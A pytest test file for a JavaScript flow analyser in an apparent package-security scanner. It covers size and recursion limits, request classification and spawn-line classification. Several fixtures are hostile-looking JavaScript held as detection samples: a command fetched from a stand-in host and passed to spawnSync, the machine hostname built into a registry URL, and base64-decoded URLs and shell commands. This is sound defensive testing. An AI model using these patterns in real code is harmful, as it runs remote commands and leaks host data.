"""What `JsFlow` answers for a file it cannot read whole: past the size limit, too deep, over its work budget.

Each answer is the one that keeps a finding: a read that fails is a gap or an unresolved fact, never an excuse.
"""

from __future__ import annotations

from typing import NoReturn

import pytest

from cordon_scanner.analysis.javascript import js_flow
from cordon_scanner.analysis.javascript.flow.summaries import JsSummaries
from cordon_scanner.analysis.javascript.flow.vocabulary import MAX_BYTES, _OverBudget
from cordon_scanner.analysis.javascript.js_flow import JsFlow

BIG = "// " + "x" * MAX_BYTES + "\n"
SMALL = 'const cp = require("child_process");\ncp.spawnSync("ls", ["-l"]);\n'


class _Kit_over_budget:
    @staticmethod
    def _over_budget(*_args: object, **_kw: object) -> NoReturn:
        raise _OverBudget


_over_budget = _Kit_over_budget._over_budget


class _Kit_too_deep:
    @staticmethod
    def _too_deep(*_args: object, **_kw: object) -> NoReturn:
        raise RecursionError


_too_deep = _Kit_too_deep._too_deep


class TestPastTheSizeLimit:
    def test_no_flows_are_reported(self) -> None:
        assert JsFlow.flows(BIG) == []
        assert JsFlow.file_flows(BIG) == []

    def test_no_requests_are_reported(self) -> None:
        assert JsFlow.requests(BIG) == []

    def test_no_span_is_ruled_out(self) -> None:
        assert JsFlow.deferred_spans(BIG) is None

    def test_no_spawn_is_discounted(self) -> None:
        assert JsFlow.safe_spawn_lines(BIG) == frozenset()
        assert JsFlow.fixed_spawn_lines(BIG) == frozenset()
        assert JsFlow.parameter_command_lines(BIG) == frozenset()

    def test_the_summaries_say_the_file_was_not_read(self) -> None:
        got = JsFlow.summaries(BIG)
        assert got["js.request"] == [[JsSummaries.UNREAD_REQUEST, 1]]
        assert got["js.require"] == [JsSummaries.UNREAD]


class TestAFailedRead:
    def test_a_file_too_deep_to_read_is_an_error_not_an_empty_answer(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(js_flow._Analysis, "run", _too_deep)
        with pytest.raises(RecursionError):
            JsFlow.flows(SMALL)

    def test_requests_over_budget_are_none(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(js_flow._Analysis, "run", _over_budget)
        assert JsFlow.requests(SMALL) == []

    def test_a_span_read_too_deep_rules_nothing_out(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(js_flow._Analysis, "deferred", _too_deep)
        assert JsFlow.deferred_spans(SMALL) is None

    @pytest.mark.parametrize("failure", [_too_deep, _over_budget])
    def test_a_spawn_read_that_fails_discounts_nothing(
        self, monkeypatch: pytest.MonkeyPatch, failure: object
    ) -> None:
        monkeypatch.setattr(js_flow._Analysis, "run", failure)
        assert JsFlow.safe_spawn_lines(SMALL) == frozenset()
        assert JsFlow.fixed_spawn_lines(SMALL + "// again\n") == frozenset()

    @pytest.mark.parametrize("failure", [_too_deep, _over_budget])
    def test_a_summary_read_that_fails_is_unresolved_not_empty(
        self, monkeypatch: pytest.MonkeyPatch, failure: object
    ) -> None:
        monkeypatch.setattr(js_flow._Analysis, "run", failure)
        got = JsFlow._summaries(SMALL)
        assert got == {
            "js.require": [JsSummaries.UNRESOLVED],
            "js.request": [[JsSummaries.UNREAD_REQUEST, 1]],
        }

    def test_a_parameter_command_read_over_budget_lowers_nothing(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(js_flow._Analysis, "run", _over_budget)
        assert JsFlow.parameter_command_lines(SMALL) == frozenset()


class TestReadOf:
    def test_a_credential_path_gives_its_contents(self) -> None:
        assert JsFlow.read_of({"secret_path"}) == {"secret_file"}
        assert JsFlow.read_of({"home_path"}) == {"home_file"}


class TestReachLimit:
    @staticmethod
    def _chain(length: int) -> str:
        """Functions defined last-called-first, so each round of the reach fixpoint reaches one more."""
        lines = [f"function f{length}() {{ go(); }}"]
        lines += [f"function f{i}() {{ f{i + 1}(); }}" for i in range(length - 1, 0, -1)]
        return "\n".join(lines) + "\nf1();\n"

    def test_a_short_chain_is_all_reached(self) -> None:
        assert JsFlow.deferred_spans(self._chain(5)) == []

    def test_a_chain_longer_than_the_rounds_takes_everything_as_reached(self) -> None:
        assert JsFlow.deferred_spans(self._chain(90)) == []

    def test_an_export_beyond_a_long_chain_stays_deferred(self) -> None:
        text = self._chain(5) + "function lone() { go(); }\nmodule.exports = lone;\n"
        assert len(JsFlow.deferred_spans(text) or []) == 1


class TestRequestKinds:
    """How `JsFlow.requests` classes a request by what its URL is built from."""

    HELPER = (
        'const https = require("https");\n'
        "function fetch(url) { return new Promise((resolve, reject) => {\n"
        "  https.get(url, res => {\n"
        "    if (res.statusCode === 302) return fetch(res.headers.location).then(resolve, reject);\n"
        '    const c = []; res.on("data", d => c.push(d));\n'
        '    res.on("end", () => resolve(Buffer.concat(c))); }); }); }\n'
    )
    TEMPLATE = (
        "function download(pkg) {\n"
        '  return fetch(`https://registry.npmjs.org/${pkg}/-/${pkg.replace("@x/", "")}-1.0.0.tgz`);\n'
        "}\n"
    )

    @staticmethod
    def kinds(text: str) -> set[str]:
        return {r.kind for r in JsFlow.requests(text)}

    def test_a_registry_helper_nothing_calls_is_other(self) -> None:
        assert self.kinds(self.HELPER + self.TEMPLATE) == {"other"}

    def test_a_call_that_passes_nothing_chooses_no_package_a_response_named(self) -> None:
        assert self.kinds(self.HELPER + self.TEMPLATE + "download();\n") == {"registry"}

    def test_a_package_passed_through_one_wrapper_is_still_the_literal(self) -> None:
        text = self.HELPER + self.TEMPLATE + 'function a(p){ download(p); }\na("@x/y");\n'
        assert self.kinds(text) == {"registry"}

    def test_a_package_passed_down_a_long_chain_of_wrappers_is_not_followed(self) -> None:
        text = (
            self.HELPER
            + self.TEMPLATE
            + "function a(p){ download(p); }\nfunction b(p){ a(p); }\n"
            + 'function c(p){ b(p); }\nfunction d(p){ c(p); }\nd("@x/y");\n'
        )
        assert self.kinds(text) == {"other"}

    def test_a_package_a_wrapper_got_from_a_response_is_other(self) -> None:
        text = (
            self.HELPER
            + self.TEMPLATE
            + "function go(q){ download(q); }\n"
            + 'async function m(){ go(await fetch("https://h.invalid/n")); }\n'
        )
        assert "registry" not in self.kinds(text)

    def test_a_registry_url_with_another_value_in_it_is_other(self) -> None:
        text = (
            'const os = require("os");\n'
            'require("https").get(`https://registry.npmjs.org/${os.hostname()}/-/a-1.tgz`);\n'
        )
        assert self.kinds(text) == {"other"}

    def test_a_url_from_the_environment_is_other(self) -> None:
        assert self.kinds('require("https").get(process.env.U, r => {});\n') == {"other"}

    def test_a_url_nothing_is_known_about_is_other(self) -> None:
        assert self.kinds('require("https").get(foo, r => {});\n') == {"other"}

    def test_a_helper_given_a_literal_url_is_other(self) -> None:
        text = self.HELPER + 'function g(u){ return fetch(u); }\ng("https://h.invalid/a");\n'
        assert self.kinds(text) == {"other"}

    def test_a_redirect_followed_is_a_redirect(self) -> None:
        assert self.kinds(self.HELPER + "module.exports = fetch;\n") == {"redirect", "other"}


class TestSpawnLines:
    def test_a_literal_command_is_safe(self) -> None:
        assert JsFlow.safe_spawn_lines(SMALL) == frozenset({2})

    def test_a_command_from_a_response_is_not_safe(self) -> None:
        text = (
            'const cp = require("child_process");\n'
            'async function go() { const r = await fetch("https://h.invalid/c");\n'
            "  cp.spawnSync(await r.text()); }\n"
        )
        assert JsFlow.safe_spawn_lines(text) == frozenset()

    def test_a_link_opened_in_the_desktop_is_not_a_safe_spawn(self) -> None:
        text = 'const cp = require("child_process");\ncp.exec("xdg-open https://h.invalid/");\n'
        assert JsFlow.safe_spawn_lines(text) == frozenset()

    def test_a_process_call_without_arguments_is_not_a_safe_spawn(self) -> None:
        text = 'const cp = require("child_process");\ncp.spawnSync();\n'
        assert JsFlow.safe_spawn_lines(text) == frozenset()

    def test_a_literal_program_with_literal_arguments_is_fixed(self) -> None:
        text = 'const cp = require("child_process");\ncp.spawnSync("taskkill", ["/PID", "4"]);\n'
        assert JsFlow.fixed_spawn_lines(text) == frozenset({2})


class TestParameterCommands:
    """A shell string a data program runs, built from parameters and literals only (note 78)."""

    HEAD = 'const {exec}=require("child_process");\n'

    @classmethod
    def lines(cls, body: str) -> frozenset[int]:
        return JsFlow.parameter_command_lines(cls.HEAD + body)

    @pytest.mark.parametrize(
        "body",
        [
            'function t(p, s){ exec("ffmpeg -i " + p + " -s " + s.w + " -f x"); }\n',
            'function t(p){ exec("ffmpeg -t " + 5 + " -i " + p); }\n',
            'function t(p){ const q = "30"; exec("ffmpeg -t " + q); }\n',
            'function t(p){ exec(("ffmpeg -t " + p)); }\n',
            'function t(p){ exec("ffmpeg " + (p)); }\n',
            'function t(p){ const c = "ffmpeg -i " + p; exec(c); }\n',
            "function t(p){ exec(`ffmpeg -i ${p}`, ()=>{}); }\n",
        ],
    )
    def test_parameters_and_literals_in_a_data_program_are_a_parameter_command(
        self, body: str
    ) -> None:
        assert self.lines(body) == frozenset({2})

    @pytest.mark.parametrize(
        "body",
        [
            'function t(p){ exec("ffmpeg" + p); }\n',
            'function t(p){ exec("ffmpeg -t " + (p ? 1 : 2)); }\n',
            'function t(p){ exec("ffmpeg -t " + f(p)); }\n',
            'function t(p){ exec("ffmpeg " + atob(p)); }\n',
            'function t(p){ exec("ffmpeg " + p[0]); }\n',
            'function t(p){ exec(p + "ffmpeg"); }\n',
            "function t(p){ exec(); }\n",
            'function t(p){ exec("ffmpeg -t " + -1); }\n',
            'function t(p){ exec("ffmpeg " + p."q"); }\n',
            'function t(p){ const c = "ffmpeg " + atob(p); exec(c); }\n',
            "function t(l){ for (const c of l) exec(c); }\n",
            'function t(p){ let c = "ffmpeg -i x"; if (p) { c = atob(p); } exec(c); }\n',
            "function t(p){ let c; exec(c); }\n",
            'function t(p){ exec("xdg-open https://h.invalid/" + atob(p)); }\n',
        ],
    )
    def test_anything_else_in_the_command_is_not(self, body: str) -> None:
        assert self.lines(body) == frozenset()

    def test_a_value_a_response_carries_into_the_command_is_not(self) -> None:
        body = (
            "async function t(p){\n"
            '  const r = await fetch("https://h.invalid/x");\n'
            '  exec("ffmpeg -i " + p + (await r.text()));\n'
            "}\n"
        )
        assert self.lines(body) == frozenset()

    def test_a_name_bound_twice_to_literals_is_a_constant(self) -> None:
        body = 'const c = "ffmpeg -i x"; const c = "ffmpeg -i y";\nexec(c);\n'
        assert self.lines(body) == frozenset({3})


class TestMoreRequestKinds:
    HELPER = TestRequestKinds.HELPER

    @pytest.mark.parametrize(
        "text",
        [
            'require("https").get(Buffer.from("aHR0cHM6Ly9oLmludmFsaWQv", "base64").toString());\n',
            'require("https").get(require("os").hostname());\n',
        ],
    )
    def test_a_url_built_from_anything_but_a_literal_or_a_reply_is_other(self, text: str) -> None:
        assert {r.kind for r in JsFlow.requests(text)} == {"other"}

    def test_a_url_passed_through_a_long_chain_of_helpers_is_other(self) -> None:
        text = (
            self.HELPER
            + "function a(u){ return fetch(u); }\nfunction b(u){ return a(u); }\n"
            + "function c(u){ return b(u); }\nfunction d(u){ return c(u); }\n"
            + "async function m(r){ return d(r.headers.location); }\n"
        )
        assert "other" in {r.kind for r in JsFlow.requests(text)}
